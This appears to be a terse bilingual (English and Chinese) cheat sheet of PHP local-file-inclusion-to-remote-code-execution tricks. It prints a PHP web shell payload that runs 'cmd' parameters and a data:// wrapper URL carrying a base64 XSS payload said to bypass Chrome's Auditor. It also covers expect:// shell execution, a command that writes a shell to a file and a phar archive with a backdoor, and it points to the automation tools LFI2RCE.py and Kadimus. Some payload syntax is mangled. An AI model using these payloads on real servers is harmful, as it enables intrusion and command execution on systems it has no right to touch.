# 核心要点

  • LFI2RCE.py to generate a custom 载荷.
  • The 载荷 encoded in base64 is "<?php system ($ GET ['cmd']);echo 'Shell done !'; ?>".
  • Fun fact: you can trigger an XSS and 绕过 the Chrome Auditor with : http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
  • When used in PHP or a similar application, it may allow an attacker to specify commands to execute in the system's shell, as the expect:// wrapper can invoke shell commands as part of its input.
  • Specify your 载荷 in the POST parameters, this can be done with a simple curl command.
  • Alternatively, Kadimus has a module to automate this attack.
  • Create an evil 载荷: echo "<pre><?php system ($ GET ['cmd']); ?></pre>" > 载荷.php;

  • Create a phar archive containing a backdoor file: php --define phar.readonly=0 archive.php
  • Vulnerable parameter should be in a POST request.
